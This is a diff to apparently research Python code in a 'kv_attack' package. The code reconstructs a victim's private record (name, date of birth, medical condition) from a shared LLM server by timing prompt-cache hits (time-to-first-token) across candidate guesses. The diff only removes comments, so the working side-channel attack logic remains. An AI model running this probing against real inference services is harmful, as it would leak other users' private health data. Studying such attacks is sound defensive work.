@@ -14,24 +14,22 @@ from kv_attack.victim_seeder import build_private_block
 from kv_attack.attacker import measure_mean_ttft, is_cache_hit
 
 
-# ── Result dataclass ──────────────────────────────────────────────────────────
 
 @dataclass
 class ReconstructionResult:
     victim_id           : int
-    ground_truth        : dict              # {"name": str, "dob": str, "condition": str}
-    recovered           : dict              # {"name": str | None, "dob": str | None, "condition": str | None}
-    token_recovery_rate : float             # fraction of RECOVERED fields correct (NOT counting given fields)
-    exact_match         : bool              # ALL recovered fields correct
+    ground_truth        : dict
+    recovered           : dict
+    token_recovery_rate : float
+    exact_match         : bool
     total_api_calls     : int
-    arpt                : float             # API calls / vocabulary tokens in recovered fields
-    known_dob           : bool              # True = DOB given, not counted in TRR/ARPT
-    n_private_blocks    : int               # reported from victim record
-    confirmed_hit       : bool              # True = Phase B produced a confirmed hit
-    scan_results        : list = field(default_factory=list)  # top-5 candidates with TTFT
+    arpt                : float
+    known_dob           : bool
+    n_private_blocks    : int
+    confirmed_hit       : bool
+    scan_results        : list = field(default_factory=list)
 
 
-# ── Helpers ───────────────────────────────────────────────────────────────────
 
 def _field_trr(gt: dict, recovered: dict, known_dob: bool) -> float:
     """
@@ -67,7 +65,7 @@ def _count_vocab_tokens(tokenizer: AutoTokenizer, recovered: dict,
         val = recovered.get(k)
         if val:
             total += len(tokenizer.encode(val, add_special_tokens=False))
-    return max(total, 1)   # avoid division by zero
+    return max(total, 1)
 
 
 def _build_candidate_list(seed: int = 0) -> list[tuple[str, str]]:
@@ -88,7 +86,6 @@ def _build_candidate_list(seed: int = 0) -> list[tuple[str, str]]:
     return candidates
 
 
-# ── Main reconstruction function ──────────────────────────────────────────────
 
 def reconstruct_victim(
     client       : OpenAI,
@@ -117,21 +114,19 @@ def reconstruct_victim(
     """
     gt            = victim_record["ground_truth"]
     victim_id     = victim_record["victim_id"]
-    reseed_prompt = victim_record["prompt"]      # used to re-seed victim blocks
+    reseed_prompt = victim_record["prompt"]
     n_priv_blocks = victim_record.get("n_private_blocks", -1)
     dob_to_use    = gt["dob"] if known_dob else None
 
     api_calls  = 0
-    scan_log: list[dict] = []   # all (candidate, mean_ttft) for the scan
+    scan_log: list[dict] = []
 
-    # ── Phase A: fast scan ────────────────────────────────────────────────────
     candidates = _build_candidate_list(seed=candidate_seed)
     print(f"[reconstructor] Victim {victim_id}: "
           f"scanning {len(candidates)} candidates (N_FAST={N_REPEATS_FAST}) ...")
 
     for probe_idx, (cand_name, cand_condition) in enumerate(candidates):
 
-        # ── Self-eviction prevention ──────────────────────────────────────────
         if probe_idx > 0 and probe_idx % RESEED_EVERY == 0:
             try:
                 client.completions.create(
@@ -143,8 +138,7 @@ def reconstruct_victim(
                 print(f"[reconstructor] WARNING: re-seed failed at probe "
                       f"{probe_idx}: {exc}")
 
-        # ── Build probe ───────────────────────────────────────────────────────
-        dob   = dob_to_use if dob_to_use else gt["dob"]   # fallback for demo
+        dob   = dob_to_use if dob_to_use else gt["dob"]
         probe = system_prefix + " " + build_private_block(
             cand_name, dob, cand_condition
         )
@@ -158,14 +152,11 @@ def reconstruct_victim(
             "mean_ttft": round(mean_ttft, 3),
         })
 
-        # Early exit: delta=487ms means hit (88ms) and miss (576ms) never overlap.
-        # First candidate below threshold is definitively the hit — stop scanning.
         if mean_ttft < threshold_ms:
             print(f"[reconstructor] Early exit at probe {probe_idx + 1}: "
                   f"TTFT={mean_ttft:.1f} ms < threshold={threshold_ms:.1f} ms")
             break
 
-    # Sort all results by TTFT ascending (lowest TTFT = most likely hit)
     scan_log.sort(key=lambda x: x["mean_ttft"])
     top_candidates = scan_log[:N_TOP_CANDIDATES]
 
@@ -173,7 +164,6 @@ def reconstruct_victim(
           f"top-5 TTFT after scan: "
           f"{[round(c['mean_ttft'], 1) for c in top_candidates]} ms")
 
-    # ── Phase B: confirmation ─────────────────────────────────────────────────
     confirmed_name      = None
     confirmed_condition = None
     confirmed_hit       = False
@@ -203,7 +193,6 @@ def reconstruct_victim(
                   f"after {api_calls} total API calls")
             break
 
-    # If no confirmed hit, take the fast-scan winner as best guess
     if not confirmed_hit:
         confirmed_name      = scan_log[0]["name"]
         confirmed_condition = scan_log[0]["condition"]
@@ -211,7 +200,6 @@ def reconstruct_victim(
               f"no confirmed hit — using fast-scan winner: "
               f"name='{confirmed_name}' condition='{confirmed_condition}'")
 
-    # ── DOB recovery (Phase 2 extension) ─────────────────────────────────────
     recovered_dob = dob_to_use
     dob_api_calls = 0
     if not known_dob and confirmed_name and confirmed_condition:
@@ -221,7 +209,6 @@ def reconstruct_victim(
         )
         api_calls += dob_api_calls
 
-    # ── Compile result ────────────────────────────────────────────────────────
     recovered = {
         "name"     : confirmed_name,
         "condition": confirmed_condition,
@@ -249,7 +236,6 @@ def reconstruct_victim(
     )
 
 
-# ── DOB year recovery (Phase 2 extension) ────────────────────────────────────
 
 def _recover_dob_year_linear(
     client       : OpenAI,
